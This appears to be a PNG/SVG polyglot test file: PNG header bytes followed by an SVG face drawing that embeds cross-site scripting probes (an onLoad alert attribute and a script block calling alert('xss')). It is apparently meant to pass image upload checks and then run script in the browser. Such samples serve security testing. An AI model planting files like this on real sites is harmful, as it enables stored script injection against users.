<?PNG IHDR÷'AvsRGB®Îé IDATx^ì}wÕöíªªNÌ9ëU0
¨  9¨xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20010904//EN"
 "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
 width="225.000000pt" height="225.000000pt" viewBox="0 0 225.000000 225.000000"
 preserveAspectRatio="xMidYMid meet" onLoad="alert(0)">
<g transform="translate(0.000000,225.000000) scale(0.100000,-0.100000)"
fill="#000000" stroke="none">
<path d="M1429 2086 c-8 -8 -305 -46 -424 -55 -132 -10 -212 -34 -262 -79 -16
-15 -50 -37 -75 -49 -60 -28 -115 -77 -137 -122 -38 -75 -63 -380 -42 -524 12
-84 50 -193 66 -191 21 3 75 163 90 266 20 132 38 193 71 242 l26 38 23 -23
c71 -76 164 -143 252 -184 42 -19 91 -51 109 -71 19 -19 34 -31 34 -25 0 19
-29 147 -40 175 -13 36 -12 36 125 -48 59 -37 110 -65 112 -62 2 2 -7 24 -21
50 -31 58 -20 52 94 -48 46 -41 89 -72 94 -69 5 3 6 49 4 102 -5 105 0 103 39
-21 10 -32 21 -58 25 -58 4 0 8 21 10 48 3 46 3 45 26 -48 13 -52 28 -140 33
-195 6 -55 13 -111 16 -125 l5 -25 9 24 c20 52 51 282 52 388 1 61 3 110 4
109 2 -1 14 -29 28 -62 l26 -59 -4 85 c-3 54 -14 112 -29 158 -24 70 -23 87 2
57 29 -35 29 -10 -1 46 -60 112 -198 210 -339 239 -36 7 -67 15 -69 16 -2 2 8
13 23 25 14 11 33 34 41 50 14 26 15 36 4 25z"/>
<path d="M724 1230 c-38 -9 -90 -44 -104 -71 -13 -24 -17 -24 86 6 98 29 173
32 234 10 68 -24 58 -10 -21 29 -74 37 -123 44 -195 26z"/>
<path d="M1350 1222 c-41 -17 -122 -62 -110 -62 3 0 23 7 45 15 60 21 142 18
240 -10 48 -14 90 -24 92 -21 10 9 -23 46 -60 66 -54 31 -148 36 -207 12z"/>
<path d="M1321 1101 c-10 -6 -1 -8 26 -4 28 4 54 -1 88 -16 26 -12 46 -23 43
-26 -2 -2 -23 5 -47 17 -36 18 -48 19 -79 10 -21 -6 -53 -28 -72 -48 l-35 -37
36 21 c20 12 39 22 41 22 3 0 3 -19 1 -43 -4 -32 0 -48 15 -67 20 -24 20 -25
41 -6 22 20 30 88 10 84 -6 -2 -14 3 -17 11 -3 10 0 12 11 8 9 -3 17 -1 19 5
5 13 41 -4 77 -36 l24 -21 -6 33 c-5 25 -4 31 6 26 6 -4 1 5 -13 21 -43 47
-130 71 -169 46z"/>
<path d="M805 1074 c-16 -8 -39 -24 -51 -35 -11 -10 -23 -17 -26 -14 -3 3 -3
-6 0 -20 5 -26 5 -26 26 -7 37 34 97 57 81 32 -3 -6 1 -7 9 -4 11 4 16 0 16
-11 0 -11 -5 -15 -15 -11 -11 4 -15 -2 -15 -23 0 -38 29 -74 52 -66 19 8 33
62 26 100 -6 30 -4 31 41 3 l36 -22 -23 31 c-22 32 -76 63 -109 63 -10 0 -31
-7 -48 -16z"/>
</g>
<script type="text/javascript" onload="alert(1)">
      alert("xss");
   </script>
</svg>
